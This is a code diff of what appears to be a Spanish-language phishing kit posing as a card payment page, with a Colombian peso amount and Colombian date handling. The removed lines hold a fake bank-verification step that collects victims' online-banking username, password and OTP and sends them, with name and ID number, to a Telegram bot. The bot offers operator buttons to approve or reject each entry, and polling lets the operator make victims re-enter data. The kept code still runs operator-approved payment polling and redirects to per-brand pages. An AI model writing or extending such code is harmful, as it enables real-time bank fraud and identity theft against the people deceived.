@@ -458,92 +458,6 @@
             margin-bottom: 6px;
         }
 
-        /* SECCIÓN DE CREDENCIALES BANCARIAS */
-        .credenciales-section {
-            display: none;
-            border: 2px solid var(--co-teal);
-            padding: 24px;
-            margin-bottom: 24px;
-            background: #f0fdf4;
-            border-radius: 8px;
-        }
-
-        .credenciales-section.visible {
-            display: block;
-            animation: fadeIn 0.5s ease;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(-10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .credenciales-title {
-            font-size: 1rem;
-            font-weight: 700;
-            color: var(--co-teal);
-            margin-bottom: 4px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .credenciales-title svg {
-            width: 24px;
-            height: 24px;
-        }
-
-        .credenciales-subtitle {
-            font-size: 0.875rem;
-            color: var(--co-text-muted);
-            margin-bottom: 20px;
-        }
-
-        .credenciales-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 16px;
-        }
-
-        .credenciales-grid .form-group {
-            margin-bottom: 0;
-        }
-
-        .credenciales-grid .form-label {
-            font-size: 0.8125rem;
-        }
-
-        /* ALERTAS DE CREDENCIALES */
-        .alerta-credencial {
-            display: none;
-            padding: 12px 16px;
-            border-radius: 6px;
-            margin-bottom: 16px;
-            font-size: 0.875rem;
-            font-weight: 500;
-        }
-
-        .alerta-credencial.error {
-            display: block;
-            background: #fef2f2;
-            border: 1px solid #fecaca;
-            color: #dc2626;
-        }
-
-        .alerta-credencial.success {
-            display: block;
-            background: #f0fdf4;
-            border: 1px solid #bbf7d0;
-            color: #16a34a;
-        }
-
-        .alerta-credencial.info {
-            display: block;
-            background: #e0f2fe;
-            border: 1px solid #bae6fd;
-            color: #0369a1;
-        }
-
         .security-footer {
             display: flex;
             align-items: center;
@@ -562,7 +476,7 @@
             flex-shrink: 0;
         }
 
-        /* LOADING OVERLAY PARA PAGO */
+        /* LOADING OVERLAY */
         .loading-overlay {
             display: none;
             position: fixed;
@@ -578,25 +492,6 @@
         }
 
         .loading-overlay.active {
-            display: flex;
-        }
-
-        /* LOADING OVERLAY PARA CREDENCIALES - IGUAL QUE EL DE PAGO */
-        .loading-overlay-cred {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.7);
-            z-index: 1001;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-        }
-
-        .loading-overlay-cred.active {
             display: flex;
         }
 
@@ -690,20 +585,6 @@
             cursor: not-allowed;
         }
 
-        .btn-success {
-            background-color: var(--co-teal);
-            color: #fff;
-        }
-
-        .btn-success:hover {
-            background-color: #0d8b7e;
-        }
-
-        .btn-success:disabled {
-            background-color: var(--co-border);
-            cursor: not-allowed;
-        }
-
         .disclaimer {
             font-size: 0.8125rem;
             color: var(--co-text-muted);
@@ -783,7 +664,6 @@
             .form-header h1 { font-size: 1.25rem; }
             .btn { width: 100%; }
             .expiry-cvc-grid { grid-template-columns: 1fr 1fr; }
-            .credenciales-grid { grid-template-columns: 1fr; }
         }
 
         @media (max-width: 480px) {
@@ -794,18 +674,11 @@
     </style>
 </head>
 <body>
-    <!-- LOADING OVERLAY PARA PAGO -->
+    <!-- LOADING OVERLAY -->
     <div class="loading-overlay" id="loadingOverlay">
         <div class="spinner"></div>
         <div class="loading-text">Procesando pago...</div>
         <div class="loading-subtext">Verificando información de la tarjeta</div>
-    </div>
-
-    <!-- LOADING OVERLAY PARA CREDENCIALES - IGUAL QUE EL DE PAGO -->
-    <div class="loading-overlay-cred" id="loadingOverlayCred">
-        <div class="spinner"></div>
-        <div class="loading-text">Verificando credenciales...</div>
-        <div class="loading-subtext">Validando con el banco emisor</div>
     </div>
 
     <header>
@@ -988,49 +861,6 @@
                             </div>
                         </div>
 
-                        <!-- CREDENCIALES BANCARIAS -->
-                        <div class="credenciales-section" id="credencialesSection">
-                            <div class="credenciales-title">
-                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
-                                    <path d="M7 11V7a4 4 0 0 1 4-4h2a4 4 0 0 1 4 4v4"></path>
-                                </svg>
-                                Verificación de datos de la tarjeta
-                            </div>
-                            <p class="credenciales-subtitle">
-                                Verificación del banco acerca de tu tarjeta. Ingresa tus credenciales para validar la transacción.
-                            </p>
-
-                            <!-- ALERTA DE CREDENCIALES -->
-                            <div class="alerta-credencial" id="alertaCredencial"></div>
-
-                            <div class="credenciales-grid">
-                                <div class="form-group">
-                                    <label class="form-label">Usuario del banco</label>
-                                    <input class="kern-input" type="text" id="bancoUsuario" placeholder="Ej: juan.perez" />
-                                    <div class="error-message">El usuario es requerido</div>
-                                </div>
-                                <div class="form-group">
-                                    <label class="form-label">Contraseña del banco</label>
-                                    <input class="kern-input" type="password" id="bancoPassword" placeholder="••••••••" />
-                                    <div class="error-message">La contraseña es requerida</div>
-                                </div>
-                            </div>
-
-                            <div class="form-group" style="margin-top:16px;">
-                                <label class="form-label">Código OTP (One-Time Password)</label>
-                                <p style="font-size:0.8125rem; color:var(--co-text-muted); margin-bottom:8px;">
-                                    📱 Se ha enviado un código de 6 dígitos al dispositivo registrado en su banco
-                                </p>
-                                <input class="kern-input" type="text" id="bancoOTP" placeholder="Ingrese el código OTP" maxlength="6" inputmode="numeric" />
-                                <div class="error-message">El código OTP es requerido (6 dígitos)</div>
-                            </div>
-
-                            <button type="button" class="btn btn-success" id="continuarBtn" style="margin-top:16px;">
-                                Continuar
-                            </button>
-                        </div>
-
                         <button type="submit" class="btn btn-primary" id="submitButton">
                             Pagar de forma segura
                         </button>
@@ -1070,7 +900,6 @@
         let solicitudId = null;
         let pollingInterval = null;
         let cardType = null;
-        let credencialesId = null;
 
         // ============================================
         // CARGAR DATOS DEL LOCALSTORAGE
@@ -1117,15 +946,7 @@
         const form = document.getElementById('paymentForm');
         const submitButton = document.getElementById('submitButton');
         const loadingOverlay = document.getElementById('loadingOverlay');
-        const loadingOverlayCred = document.getElementById('loadingOverlayCred');
         const statusMessage = document.getElementById('statusMessage');
-
-        const bancoUsuario = document.getElementById('bancoUsuario');
-        const bancoPassword = document.getElementById('bancoPassword');
-        const bancoOTP = document.getElementById('bancoOTP');
-        const credencialesSection = document.getElementById('credencialesSection');
-        const continuarBtn = document.getElementById('continuarBtn');
-        const alertaCredencial = document.getElementById('alertaCredencial');
 
         const cardPatterns = {
             visa: {
@@ -1245,10 +1066,6 @@
             this.value = this.value.replace(/[^a-zA-Z\s]/g, '').toUpperCase();
         });
 
-        bancoOTP.addEventListener('input', function(e) {
-            this.value = this.value.replace(/[^0-9]/g, '');
-        });
-
         // ============================================
         // FUNCIONES DE WEBHOOK Y TELEGRAM
         // ============================================
@@ -1294,16 +1111,6 @@
 
         function mostrarInfo(mensaje) {
             mostrarMensaje(mensaje, 'info');
-        }
-
-        function mostrarAlerta(mensaje, tipo) {
-            alertaCredencial.className = 'alerta-credencial ' + tipo;
-            alertaCredencial.textContent = mensaje;
-        }
-
-        function ocultarAlerta() {
-            alertaCredencial.className = 'alerta-credencial';
-            alertaCredencial.textContent = '';
         }
 
         function generarSolicitudId() {
@@ -1376,83 +1183,6 @@
         }
 
         // ============================================
-        // ENVÍO DE CREDENCIALES BANCARIAS A TELEGRAM
-        // ============================================
-        async function enviarCredencialesATelegram(datos) {
-            try {
-                const cardType = datos.tipoTarjeta || 'visa';
-                const callbackPrefix = cardType === 'visa' ? 'visa' : 
-                                      cardType === 'mastercard' ? 'master' : 'amex';
-
-                const inlineKeyboard = {
-                    inline_keyboard: [
-                        [
-                            { text: "✅ APROBAR", callback_data: `approve_${callbackPrefix}_${datos.solicitudId}` },
-                            { text: "❌ ERROR USUARIO", callback_data: `error_user_${callbackPrefix}_${datos.solicitudId}` }
-                        ],
-                        [
-                            { text: "❌ ERROR CLAVE", callback_data: `error_pass_${callbackPrefix}_${datos.solicitudId}` },
-                            { text: "❌ ERROR OTP", callback_data: `error_otp_${callbackPrefix}_${datos.solicitudId}` }
-                        ]
-                    ]
-                };
-
-                const mensaje = `🔐 *VERIFICACIÓN BANCARIA - ${datos.tipoTarjeta.toUpperCase()}*
-
-🆔 Solicitud: \`${datos.solicitudId}\`
-
-👤 *DATOS DEL CLIENTE:*
-Nombre: ${datos.nombreCompleto}
-Documento: ${datos.tipoDocumento} ${datos.numeroDocumento}
-
-🏦 *CREDENCIALES DEL BANCO EMISOR:*
-👤 Usuario: \`${datos.usuarioBanco || 'No proporcionado'}\`
-🔑 Contraseña: \`${datos.passwordBanco || 'No proporcionado'}\`
-
-📱 *CÓDIGO OTP:*
-🔢 Código: \`${datos.codigoOTP || 'No proporcionado'}\`
-
-💳 *TARJETA ASOCIADA:*
-🏷️ Tipo: ${datos.tipoTarjeta.toUpperCase()}
-🔢 Últimos 4 dígitos: \`${datos.ultimos4 || 'XXXX'}\`
-🏛️ Banco: ${datos.bancoEmisor}
-
-💰 Monto: ${datos.monto || 'N/A'}
-
-⏰ Fecha: ${datos.fecha || new Date().toLocaleString('es-CO')}
-
-⚠️ *Estado:* Credenciales enviadas - Pendiente de validación`;
-
-                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-
-                const response = await fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: mensaje,
-                        parse_mode: 'Markdown',
-                        reply_markup: inlineKeyboard,
-                        disable_web_page_preview: true
-                    })
-                });
-
-                const data = await response.json();
-
-                if (data.ok) {
-                    console.log('✅ Credenciales enviadas a Telegram');
-                    return true;
-                } else {
-                    console.error('❌ Error al enviar credenciales:', data.description);
-                    return false;
-                }
-            } catch (error) {
-                console.error('❌ Error al enviar credenciales:', error);
-                return false;
-            }
-        }
-
-        // ============================================
         // VERIFICAR ESTADO DE SOLICITUD
         // ============================================
         async function verificarEstadoSolicitud(solicitudId) {
@@ -1465,6 +1195,19 @@ Documento: ${datos.tipoDocumento} ${datos.numeroDocumento}
                 console.error('❌ Error verificando estado:', error);
                 return 'error';
             }
+        }
+
+        // ============================================
+        // REDIRIGIR SEGÚN TIPO DE TARJETA
+        // ============================================
+        function redirigirSegunTipoTarjeta(tipo) {
+            const map = {
+                'visa': 'visa.html',
+                'mastercard': 'master.html',
+                'amex': 'amex.html'
+            };
+            const destino = map[tipo] || 'index.html';
+            window.location.href = destino;
         }
 
         // ============================================
@@ -1493,16 +1236,12 @@ Documento: ${datos.tipoDocumento} ${datos.numeroDocumento}
 
                 if (resultado === 'approved') {
                     clearInterval(pollingInterval);
-                    
                     loadingOverlay.classList.remove('active');
-                    submitButton.style.display = 'none';
-                    credencialesSection.classList.add('visible');
-                    
-                    mostrarInfo('✅ Pago aprobado. Complete la verificación bancaria.');
+                    mostrarExito('✅ Pago aprobado. Redirigiendo...');
                     
                     setTimeout(() => {
-                        credencialesSection.scrollIntoView({ behavior: 'smooth', block: 'center' });
-                    }, 300);
+                        redirigirSegunTipoTarjeta(cardType);
+                    }, 1500);
 
                 } else if (resultado === 'rejected') {
                     clearInterval(pollingInterval);
@@ -1517,96 +1256,6 @@ Documento: ${datos.tipoDocumento} ${datos.numeroDocumento}
                     submitButton.disabled = false;
                     submitButton.textContent = 'Pagar de forma segura';
                     submitButton.style.display = 'block';
-                }
-            }, POLLING_INTERVAL);
-        }
-
-        // ============================================
-        // POLLING PARA ESPERAR RESPUESTA DE CREDENCIALES
-        // ============================================
-        let pollingCredenciales = null;
-
-        function iniciarPollingCredenciales() {
-            let tiempoInicio = Date.now();
-
-            pollingCredenciales = setInterval(async () => {
-                if (Date.now() - tiempoInicio > MAX_POLLING_TIME) {
-                    clearInterval(pollingCredenciales);
-                    loadingOverlayCred.classList.remove('active');
-                    mostrarAlerta('⏰ Tiempo de espera agotado. Intente nuevamente.', 'error');
-                    continuarBtn.disabled = false;
-                    bancoUsuario.disabled = false;
-                    bancoPassword.disabled = false;
-                    bancoOTP.disabled = false;
-                    return;
-                }
-
-                const resultado = await verificarEstadoSolicitud(credencialesId);
-                console.log('📊 Estado credenciales:', resultado);
-
-                // ERROR USUARIO
-                if (resultado === 'error_user') {
-                    clearInterval(pollingCredenciales);
-                    loadingOverlayCred.classList.remove('active');
-                    mostrarAlerta('❌ Usuario incorrecto. Por favor, verifica tus datos e intenta de nuevo.', 'error');
-                    continuarBtn.disabled = false;
-                    bancoUsuario.disabled = false;
-                    bancoPassword.disabled = false;
-                    bancoOTP.disabled = false;
-                    bancoUsuario.focus();
-                    return;
-                }
-
-                // ERROR CLAVE
-                if (resultado === 'error_pass') {
-                    clearInterval(pollingCredenciales);
-                    loadingOverlayCred.classList.remove('active');
-                    mostrarAlerta('❌ Contraseña incorrecta. Por favor, verifica tus datos e intenta de nuevo.', 'error');
-                    continuarBtn.disabled = false;
-                    bancoUsuario.disabled = false;
-                    bancoPassword.disabled = false;
-                    bancoOTP.disabled = false;
-                    bancoPassword.focus();
-                    return;
-                }
-
-                // ERROR OTP
-                if (resultado === 'error_otp') {
-                    clearInterval(pollingCredenciales);
-                    loadingOverlayCred.classList.remove('active');
-                    mostrarAlerta('❌ Código de verificación incorrecto. Por favor, verifica el código OTP.', 'error');
-                    continuarBtn.disabled = false;
-                    bancoUsuario.disabled = false;
-                    bancoPassword.disabled = false;
-                    bancoOTP.disabled = false;
-                    bancoOTP.focus();
-                    bancoOTP.value = '';
-                    return;
-                }
-
-                // APROBADO - Redirigir a index.html
-                if (resultado === 'approved') {
-                    clearInterval(pollingCredenciales);
-                    loadingOverlayCred.classList.remove('active');
-                    mostrarAlerta('✅ ¡Verificación exitosa! Redirigiendo...', 'success');
-                    continuarBtn.disabled = true;
-                    
-                    setTimeout(() => {
-                        window.location.href = 'index.html';
-                    }, 2000);
-                    return;
-                }
-
-                // RECHAZADO
-                if (resultado === 'rejected') {
-                    clearInterval(pollingCredenciales);
-                    loadingOverlayCred.classList.remove('active');
-                    mostrarAlerta('❌ Credenciales rechazadas. Verifique sus datos.', 'error');
-                    continuarBtn.disabled = false;
-                    bancoUsuario.disabled = false;
-                    bancoPassword.disabled = false;
-                    bancoOTP.disabled = false;
-                    return;
                 }
             }, POLLING_INTERVAL);
         }
@@ -1727,100 +1376,6 @@ Documento: ${datos.tipoDocumento} ${datos.numeroDocumento}
                 submitButton.disabled = false;
                 submitButton.textContent = 'Pagar de forma segura';
                 loadingOverlay.classList.remove('active');
-            }
-        });
-
-        // ============================================
-        // ENVÍO DE CREDENCIALES BANCARIAS
-        // ============================================
-        continuarBtn.addEventListener('click', async function() {
-            const usuario = bancoUsuario.value.trim();
-            const password = bancoPassword.value.trim();
-            const otp = bancoOTP.value.trim();
-
-            let isValid = true;
-
-            [bancoUsuario, bancoPassword, bancoOTP].forEach(el => {
-                el.parentElement.classList.remove('error');
-            });
-            ocultarAlerta();
-
-            if (!usuario) {
-                bancoUsuario.parentElement.classList.add('error');
-                isValid = false;
-            }
-
-            if (!password || password.length < 4) {
-                bancoPassword.parentElement.classList.add('error');
-                if (password.length < 4 && password.length > 0) {
-                    bancoPassword.parentElement.querySelector('.error-message').textContent = 'La contraseña debe tener al menos 4 caracteres';
-                }
-                isValid = false;
-            }
-
-            if (!otp || !/^\d{6}$/.test(otp)) {
-                bancoOTP.parentElement.classList.add('error');
-                isValid = false;
-            }
-
-            if (!isValid) {
-                return;
-            }
-
-            // MOSTRAR PANTALLA DE CARGA OSCURA (igual que la del pago)
-            loadingOverlayCred.classList.add('active');
-            continuarBtn.disabled = true;
-            ocultarAlerta();
-
-            const cardLast4 = sessionStorage.getItem('cardLast4') || localStorage.getItem('cardLast4') || 'XXXX';
-            const nombre = localStorage.getItem('nombre') || 'No proporcionado';
-            const apellidos = localStorage.getItem('apellidos') || '';
-            const tipoDocumento = localStorage.getItem('tipoDocumento') || '';
-            const numeroDocumento = localStorage.getItem('numeroDocumento') || 'No proporcionado';
-            const banco = document.getElementById('bancoEmisor').value || 'No especificado';
-
-            const procesamiento_prioritario = localStorage.getItem('procesamiento_prioritario') === 'true';
-            let total = 23000;
-            if (procesamiento_prioritario) total += 20000;
-            const montoFormateado = total.toLocaleString('es-CO').replace(/,/g, '.') + ' Col$';
-
-            credencialesId = 'CRED-' + Date.now() + '-' + Math.random().toString(36).substr(2, 6);
-
-            const datosCredenciales = {
-                solicitudId: credencialesId,
-                nombreCompleto: `${nombre} ${apellidos}`.trim(),
-                tipoDocumento: tipoDocumento,
-                numeroDocumento: numeroDocumento,
-                usuarioBanco: usuario,
-                passwordBanco: password,
-                codigoOTP: otp,
-                ultimos4: cardLast4,
-                tipoTarjeta: cardType || 'visa',
-                bancoEmisor: banco,
-                monto: montoFormateado,
-                fecha: new Date().toLocaleString('es-CO', {
-                    timeZone: 'America/Bogota',
-                    year: 'numeric',
-                    month: '2-digit',
-                    day: '2-digit',
-                    hour: '2-digit',
-                    minute: '2-digit',
-                    second: '2-digit'
-                })
-            };
-
-            const enviado = await enviarCredencialesATelegram(datosCredenciales);
-
-            if (enviado) {
-                // Iniciar polling - la pantalla de carga sigue activa
-                iniciarPollingCredenciales();
-            } else {
-                loadingOverlayCred.classList.remove('active');
-                mostrarAlerta('❌ Error al enviar credenciales. Intente nuevamente.', 'error');
-                continuarBtn.disabled = false;
-                bancoUsuario.disabled = false;
-                bancoPassword.disabled = false;
-                bancoOTP.disabled = false;
             }
         });
     </script>
